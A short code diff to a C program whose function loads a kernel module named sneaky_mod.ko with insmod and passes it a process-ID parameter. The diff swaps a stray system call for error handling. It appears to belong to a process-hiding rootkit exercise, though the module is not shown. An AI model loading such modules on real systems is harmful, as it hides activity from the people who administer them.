@@ -13,7 +13,8 @@ void insert_sneaky_mod(int sneaky_pid) {
   char sneaky_pid_str[100];
   snprintf(sneaky_pid_str, sizeof(sneaky_pid_str), "sneaky_pid=%d", sneaky_pid);
   execl("/sbin/insmod", "insmod", "sneaky_mod.ko", sneaky_pid_str, NULL);
-  system(arg);
+  perror("Error executing insmod");
+  exit(EXIT_FAILURE);
 }
 
 void waitq() {
